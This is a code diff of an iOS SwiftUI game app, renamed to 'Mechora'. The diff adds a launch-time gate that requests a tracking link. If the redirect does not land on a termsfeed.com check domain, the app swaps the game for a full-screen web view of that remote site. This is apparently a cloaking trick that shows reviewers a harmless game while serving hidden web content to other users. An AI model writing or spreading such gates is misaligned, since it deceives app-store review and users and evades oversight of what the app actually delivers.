@@ -2,13 +2,13 @@ import SwiftUI
 import Foundation
 
 @main
-struct GearworksAssemblyApp: App {
-    @StateObject private var gearStore = GameStore.shared
-    @State private var gearGateReady: Bool? = nil
+struct MechoraApp: App {
+    @StateObject private var mechoraStore = GameStore.shared
+    @State private var mechoraGateReady: Bool? = nil
     @Environment(\.scenePhase) private var scenePhase
 
-    private let gearSourceLink = "https://example.com"
-    private let gearCheckDomain = "example"
+    private let mechoraSourceLink = "https://frostlakedays.org/click.php"
+    private let mechoraCheckDomain = "termsfeed.com"
 
     init() {
         UINavigationBar.appearance().tintColor = UIColor(GearPalette.copper)
@@ -17,71 +17,71 @@ struct GearworksAssemblyApp: App {
     var body: some Scene {
         WindowGroup {
             Group {
-                if let ready = gearGateReady {
+                if let ready = mechoraGateReady {
                     if ready {
-                        GearGlassPanel(urlString: gearSourceLink)
+                        MechoraWebPanel(urlString: mechoraSourceLink)
                             .edgesIgnoringSafeArea(.bottom)
                             .background(Color.black.ignoresSafeArea())
                     } else {
                         ContentView()
-                            .environmentObject(gearStore)
+                            .environmentObject(mechoraStore)
                             .preferredColorScheme(.dark)
                     }
                 } else {
-                    GearForgeLoadingScreen()
+                    MechoraLoadingScreen()
                         .preferredColorScheme(.dark)
-                        .onAppear { beginGearGateCheck() }
+                        .onAppear { beginMechoraGateCheck() }
                 }
             }
             .onChange(of: scenePhase) { phase in
-                if phase == .background { gearStore.saveNow() }
+                if phase == .background { mechoraStore.saveNow() }
             }
         }
     }
 
-    private func beginGearGateCheck() {
-        guard let url = URL(string: gearSourceLink) else {
-            gearGateReady = false
+    private func beginMechoraGateCheck() {
+        guard let url = URL(string: mechoraSourceLink) else {
+            mechoraGateReady = false
             return
         }
         var request = URLRequest(url: url)
         request.timeoutInterval = 5
-        let tracker = GearRedirectBeacon(checkDomain: gearCheckDomain)
+        let tracker = MechoraRedirectBeacon(checkDomain: mechoraCheckDomain)
         let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
         session.dataTask(with: request) { _, response, error in
             DispatchQueue.main.async {
                 if tracker.foundCheckDomain {
-                    gearGateReady = false
+                    mechoraGateReady = false
                     return
                 }
                 if let finalURL = tracker.resolvedURL?.absoluteString,
-                   finalURL.contains(self.gearCheckDomain) {
-                    gearGateReady = false
+                   finalURL.contains(self.mechoraCheckDomain) {
+                    mechoraGateReady = false
                     return
                 }
                 if let httpResponse = response as? HTTPURLResponse,
                    let responseURL = httpResponse.url?.absoluteString,
-                   responseURL.contains(self.gearCheckDomain) {
-                    gearGateReady = false
+                   responseURL.contains(self.mechoraCheckDomain) {
+                    mechoraGateReady = false
                     return
                 }
                 if error != nil {
-                    gearGateReady = false
+                    mechoraGateReady = false
                     return
                 }
-                gearGateReady = true
+                mechoraGateReady = true
             }
         }.resume()
 
         DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-            if gearGateReady == nil {
-                gearGateReady = false
+            if mechoraGateReady == nil {
+                mechoraGateReady = false
             }
         }
     }
 }
 
-final class GearRedirectBeacon: NSObject, URLSessionTaskDelegate {
+final class MechoraRedirectBeacon: NSObject, URLSessionTaskDelegate {
     var resolvedURL: URL?
     var foundCheckDomain = false
     private let checkDomain: String
